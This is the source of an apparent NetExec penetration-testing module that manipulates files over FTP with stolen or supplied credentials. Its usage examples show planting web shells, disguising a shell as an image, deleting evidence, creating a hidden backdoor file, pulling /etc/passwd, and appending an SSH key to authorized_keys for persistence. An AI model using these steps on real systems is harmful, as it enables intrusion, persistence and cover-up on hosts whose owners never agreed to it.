import os
from ftplib import FTP

class NXCModule:
    """
    Module by: @m7arm4n
    """
    name = "actions_ftp"
    description = "Ultimate FTP control: rename/delete/copy/move/chmod/upload/download/append"
    supported_protocols = ["ftp"]
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        """
                ACTION      Required. What to do:
                            rename | move | delete | copy | chmod | touch | mkdir | upload | download | append

                SRC / FILE / LOCAL
                            Source path — used differently depending on ACTION:
                            • rename/move/copy/delete/chmod/touch → remote file path
                            • upload → local file on your machine
                            • download → remote file to download

                DST / REMOTE
                            Destination path — used for:
                            • rename/move/copy → new remote path
                            • upload → remote directory or full path
                            • append → remote file to inject into

                PERM        Octal permissions for chmod (e.g. 755, 644, 777, 600)

                EXAMPLES:
                nxc ftp 10.10.10.10 -u user -p pass -M actions -o ACTION=rename SRC=/shell.php DST=/logo.jpg
                nxc ftp 10.10.10.10 -u user -p pass -M actions -o ACTION=delete FILE=/tmp/evidence.txt
                nxc ftp 10.10.10.10 -u user -p pass -M actions -o ACTION=copy SRC=/uploads/shell.php DST=/var/www/html/shell.php
                nxc ftp 10.10.10.10 -u user -p pass -M actions -o ACTION=move SRC=/old.txt DST=/new/location.txt
                nxc ftp 10.10.10.10 -u user -p pass -M actions -o ACTION=chmod FILE=/shell.php PERM=755
                nxc ftp 10.10.10.10 -u user -p pass -M actions -o ACTION=touch FILE=/tmp/.backdoor
                nxc ftp 10.10.10.10 -u user -p pass -M actions -o ACTION=mkdir DIR=/var/www/html/.git
                nxc ftp 10.10.10.10.10 -u user -p pass -M actions -o ACTION=upload LOCAL=./rev.php REMOTE=/var/www/html/
                nxc ftp 10.10.10.10 -u user -p pass -M actions -o ACTION=download FILE=/etc/passwd
                nxc ftp 10.10.10.10 -u user -p pass -M actions -o ACTION=append LOCAL=id_rsa.pub DST=/home/user/.ssh/authorized_keys
                nxc ftp 10.10.10.10 -u user -p pass -M actions -o ACTION=append LOCAL=evil.php DST=/var/www/html/config.php
                """
        self.action = (module_options.get("ACTION") or "").strip().lower()
        self.src    = module_options.get("SRC") or module_options.get("FILE") or module_options.get("LOCAL")
        self.dst    = module_options.get("DST") or module_options.get("REMOTE")
        self.perm   = module_options.get("PERM")

        if not self.action:
            raise ValueError("ACTION required! (rename/delete/copy/move/chmod/touch/mkdir/upload/download/append)")

        valid = ["rename","delete","copy","move","chmod","touch","mkdir","upload","download","append"]
        if self.action not in valid:
            raise ValueError(f"Invalid ACTION. Use: {', '.join(valid)}")

    def on_login(self, context, connection):
        user = context.username[0] if isinstance(context.username, list) else context.username
        pwd  = context.password[0] if isinstance(context.password, list) else (context.password or "")
        host = connection.host


        connection.logger.highlight(f"[ACTION] {self.action.upper()} → {self.src or ''} → {self.dst or ''}")

        ftp = FTP()
        try:
            ftp.connect(host, connection.port or 21, timeout=20)
            ftp.login(user, pwd if pwd else "")
        except Exception as e:
            connection.logger.fail(f"FTP login failed: {e}")
            return False

        success = False

        try:
            if self.action in ["rename", "move"]:
                ftp.rename(self.src, self.dst)
                connection.logger.success(f"{self.action.title()}d: {self.src} → {self.dst}")
                success = True

            elif self.action == "delete":
                ftp.delete(self.src)
                connection.logger.success(f"Deleted: {self.src}")
                success = True

            elif self.action == "copy":
                tmp = f".nxc_copy_{os.urandom(4).hex()}"
                with open(tmp, "wb") as f: ftp.retrbinary(f"RETR {self.src}", f.write)
                with open(tmp, "rb") as f: ftp.storbinary(f"STOR {self.dst}", f)
                os.remove(tmp)
                connection.logger.success(f"Copied: {self.src} → {self.dst}")
                success = True

            elif self.action == "chmod":
                resp = ftp.sendcmd(f"SITE CHMOD {self.perm} {self.src}")
                connection.logger.success(f"CHMOD {self.perm} → {self.src}")
                connection.logger.highlight(resp)
                success = True

            elif self.action == "touch":
                ftp.storbinary(f"STOR {self.src}", open(os.devnull, "rb"))
                connection.logger.success(f"Created: {self.src}")
                success = True

            elif self.action == "mkdir":
                ftp.mkd(self.src)
                connection.logger.success(f"Directory created: {self.src}")
                success = True

            elif self.action == "upload":
                if not os.path.isfile(self.src):
                    connection.logger.fail(f"Local file not found: {self.src}")
                else:
                    remote = self.dst.rstrip("/") + "/" + os.path.basename(self.src) if self.dst else self.src
                    with open(self.src, "rb") as f:
                        ftp.storbinary(f"STOR {remote}", f)
                    connection.logger.success(f"Uploaded → {remote}")
                    success = True

            elif self.action == "download":
                loot = os.path.join("loot", "ftp", host)
                os.makedirs(loot, exist_ok=True)
                local_path = os.path.join(loot, os.path.basename(self.src))
                with open(local_path, "wb") as f:
                    ftp.retrbinary(f"RETR {self.src}", f.write)
                connection.logger.success(f"Downloaded → {local_path}")
                success = True


            elif self.action == "append":
                if not os.path.isfile(self.src):
                    connection.logger.fail(f"Local payload not found: {self.src}")
                elif not self.dst:
                    connection.logger.fail("DST (remote target file) is required for append")
                else:

                    with open(self.src, "rb") as f:
                        ftp.storbinary(f"APPE {self.dst}", f)
                    connection.logger.success(f"APPENDED payload → {self.dst}")
                    connection.logger.highlight(f"    Injected {os.path.getsize(self.src)} bytes")
                    success = True

        except Exception as e:
            connection.logger.fail(f"Failed: {e}")

        try: ftp.quit()
        except: pass

        return success